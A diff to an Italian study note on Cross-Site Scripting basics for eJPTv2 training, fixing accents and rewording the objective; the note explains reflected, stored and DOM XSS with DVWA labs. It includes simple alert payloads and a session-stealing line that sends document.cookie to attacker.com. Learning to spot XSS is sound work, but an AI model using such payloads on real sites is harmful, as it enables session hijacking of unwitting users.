@@ -1,15 +1,15 @@
 # XSS Basics
 
-**Difficolta:** Beginner-Intermediate
+**Difficoltà:** Beginner-Intermediate
 **Time to Master:** 1.5h
 **Prerequisiti:** [02-SQL-Injection-Basics.md](02-SQL-Injection-Basics.md)
-**Lab:** DVWA / bWAPP — XSS
+**Lab:** DVWA / bWAPP, XSS
 
 ---
 
 ## Obiettivo
 
-Riconoscere e dimostrare Cross-Site Scripting reflected e stored a livello base, capire l'impatto reale (furto sessione) senza approfondire le evasion avanzate (fuori scope eJPTv2, coperte in eWPT).
+Un `<script>alert(1)</script>` che spunta in un popup sembra un giochetto innocuo, finché non realizzi che qualsiasi cosa un tuo script può fare nel browser della vittima — incluso leggere il suo cookie di sessione — la può fare anche il tuo payload. Qui impari a riconoscere e dimostrare Cross-Site Scripting reflected e stored a livello base, e a collegare quel popup al suo impatto reale (session hijacking), senza ancora addentrarti nelle evasion avanzate: quelle sono roba da eWPT.
 
 ---
 
@@ -20,7 +20,7 @@ Riconoscere e dimostrare Cross-Site Scripting reflected e stored a livello base,
 | Tipo | Descrizione | Persistenza |
 |------|-------------|-------------|
 | Reflected | il payload torna nella risposta immediata (es. parametro di ricerca) | nessuna, serve un link malevolo cliccato dalla vittima |
-| Stored | il payload viene salvato dal server (es. commento) e servito a ogni visitatore | persistente finche non viene rimosso |
+| Stored | il payload viene salvato dal server (es. commento) e servito a ogni visitatore | persistente finché non viene rimosso |
 | DOM-based | il payload viene eseguito da JavaScript lato client senza mai passare dal server | dipende dal codice client |
 
 ### Dove si testa
@@ -33,7 +33,7 @@ Qualsiasi input che viene riflesso nella pagina: parametri di ricerca, campi com
 
 | Tool | Comando base | Output | Note |
 |------|---------------|--------|------|
-| Browser DevTools | ispezione manuale | conferma esecuzione script | il metodo piu affidabile per XSS base |
+| Browser DevTools | ispezione manuale | conferma esecuzione script | il metodo più affidabile per XSS base |
 | Burp Repeater | invio payload modificati | risposta HTML completa | utile per vedere se il payload viene filtrato/encodato |
 
 ---
@@ -48,7 +48,7 @@ http://target.com/search?q=<script>alert(1)</script>
 
 **Output atteso:** popup con "1" quando la pagina viene renderizzata dal browser della vittima.
 
-**Spiegazione:** se il parametro `q` viene stampato nell'HTML senza encoding (es. `<div>Risultati per: <script>alert(1)</script></div>`), il browser esegue lo script. E la prova di concetto minima per dimostrare la vulnerabilita.
+**Spiegazione:** se il parametro `q` viene stampato nell'HTML senza encoding (es. `<div>Risultati per: <script>alert(1)</script></div>`), il browser esegue lo script. È la prova di concetto minima per dimostrare la vulnerabilità.
 
 ### Esempio 2: stored XSS su un campo commento
 
@@ -56,21 +56,21 @@ http://target.com/search?q=<script>alert(1)</script>
 Commento: <script>alert(document.cookie)</script>
 ```
 
-**Spiegazione:** se il campo commento viene salvato e mostrato ad ogni utente che visita la pagina, il payload si esegue per ogni visitatore: impatto molto piu ampio del reflected.
+**Spiegazione:** se il campo commento viene salvato e mostrato ad ogni utente che visita la pagina, il payload si esegue per ogni visitatore: impatto molto più ampio del reflected.
 
-### Esempio 3: impatto reale — furto di sessione (concettuale)
+### Esempio 3: impatto reale: furto di sessione (concettuale)
 
 ```
 <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
 ```
 
-**Spiegazione:** questo payload invia il cookie della vittima a un server controllato dall'attaccante; se il cookie di sessione non ha il flag `HttpOnly`, puo essere letto da JavaScript ed esfiltrato, permettendo session hijacking. Da dimostrare solo in lab (mai contro utenti reali senza autorizzazione).
+**Spiegazione:** questo payload invia il cookie della vittima a un server controllato dall'attaccante; se il cookie di sessione non ha il flag `HttpOnly`, può essere letto da JavaScript ed esfiltrato, permettendo session hijacking. Da dimostrare solo in lab (mai contro utenti reali senza autorizzazione).
 
 ---
 
 ## Lab Hands-On
 
-### Lab 1: DVWA — Reflected e Stored XSS (livello low)
+### Lab 1: DVWA, Reflected e Stored XSS (livello low)
 **Obiettivo:** dimostrare entrambe le varianti su DVWA
 **Difficulty:** Facile
 **Time:** 30 min
@@ -85,13 +85,13 @@ Commento: <script>alert(document.cookie)</script>
 ## Common Mistakes
 
 - Testare solo `alert(1)` senza capire dove finisce l'input nell'HTML -> a volte serve chiudere un tag/attributo per far eseguire lo script
-- Sottovalutare la stored XSS -> impatto molto piu alto del reflected, va sempre segnalata con priorita maggiore
+- Sottovalutare la stored XSS -> impatto molto più alto del reflected, va sempre segnalata con priorità maggiore
 
 ---
 
 ## Link Utili
 
-- [PortSwigger Academy — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
+- [PortSwigger Academy: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
 
 ---
 
@@ -107,10 +107,5 @@ Commento: <script>alert(document.cookie)</script>
 
 - [ ] So la differenza tra reflected, stored e DOM-based XSS
 - [ ] So dimostrare un XSS di base con un payload alert()
-- [ ] Capisco perche una stored XSS ha impatto maggiore di una reflected
+- [ ] Capisco perché una stored XSS ha impatto maggiore di una reflected
 
----
-
-## Note personali
-
-_(spazio libero)_
